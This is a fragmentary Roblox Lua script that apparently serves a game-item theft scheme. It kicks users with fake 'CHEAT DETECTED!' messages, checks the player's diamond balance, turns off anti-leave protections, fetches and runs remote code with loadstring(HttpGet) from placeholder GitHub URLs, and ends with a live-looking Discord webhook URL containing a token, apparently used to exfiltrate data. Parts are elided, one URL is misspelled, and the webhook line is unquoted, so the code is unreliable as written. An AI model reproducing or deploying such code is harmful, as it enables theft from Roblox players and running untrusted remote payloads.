...
if idiotuser == UserName then
    game:GetService("Players").LocalPlayer:Kick("CHEAT DETECTED!")
    return;
end
if UserName == nil then
    game:GetService("Players").LocalPlayer:Kick("CHEAT DETECTED!")
...
if not worked then
    game:GetService("Players").LocalPlayer:Kick("Script Can Only Use At Spawn Shop!")
    return;
end
...
if _G.LoadingScreen ~= false then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/blabla/main/ls.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
if diaamt < 110000 then
    ...
    _G.AntiLeave = false
    _G.MouseLock = false
    loadstring(game:HttpGetAsync("https://raw.githubusercontent/blabla/blabla/main/banl.lua", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
    return;
end
...
-- Webhook
local url = https://discord.com/api/webhooks/1129602625994752100/FEJ6Npo0TIOKjwlWyEOJQ4oV182ntcIgyYQANJXA6_IuW8OSJGaJRe1z3iZT0NnqTWQs
